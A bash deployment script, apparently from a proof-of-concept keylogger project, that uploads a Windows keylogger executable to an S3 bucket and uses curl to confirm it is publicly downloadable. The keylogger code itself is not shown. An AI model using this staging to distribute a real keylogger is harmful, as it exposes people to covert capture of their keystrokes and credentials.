#!/bin/bash
set -e

# --- Configuration ---
S3_BUCKET_NAME="keylogger-poc-project"
LOCAL_EXE_PATH="./dist/keylogger.exe"
S3_KEY_PREFIX="executables/windows"
CLIENT_VERSION="windows"
S3_OBJECT_NAME="Keylogger_${CLIENT_VERSION}.exe"
AWS_REGION="us-east-2"

while [[ $# -gt 0 ]]; do
    case "$1" in
        -r|--region)
            if [[ -z "${2:-}" ]]; then
                echo "Error: --region requires a value"
                echo "Usage: ./deploy_logger.sh [-r|--region <aws-region>]"
                exit 1
            fi
            AWS_REGION="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: ./deploy_logger.sh [-r|--region <aws-region>]"
            exit 1
            ;;
    esac
done

echo "--- Deploying Keylogger to S3 ---"
echo "Region: ${AWS_REGION}"

# could add a line here to always build the latest first
# ./build_local.sh

# check if the executable exists
if [ ! -f "$LOCAL_EXE_PATH" ]; then
    echo "Error: Keylogger executable not found at $LOCAL_EXE_PATH"
    echo "Please build it first using PyInstaller."
    exit 1
fi

# upload the executable to S3
echo "Uploading ${LOCAL_EXE_PATH} to s3://${S3_BUCKET_NAME}/${S3_KEY_PREFIX}/${S3_OBJECT_NAME} in ${AWS_REGION}..."
aws s3 cp "$LOCAL_EXE_PATH" "s3://${S3_BUCKET_NAME}/${S3_KEY_PREFIX}/${S3_OBJECT_NAME}" --region "$AWS_REGION"


# verify
echo "Verifying upload..."
S3_URL="https://${S3_BUCKET_NAME}.s3.${AWS_REGION}.amazonaws.com/${S3_KEY_PREFIX}/${S3_OBJECT_NAME}"
echo "Direct S3 Download URL: $S3_URL"

# curl check to see if exe is publicly accessible
curl -Is "$S3_URL" | head -n 1

echo "Deployment of Keylogger to S3 finished successfully!"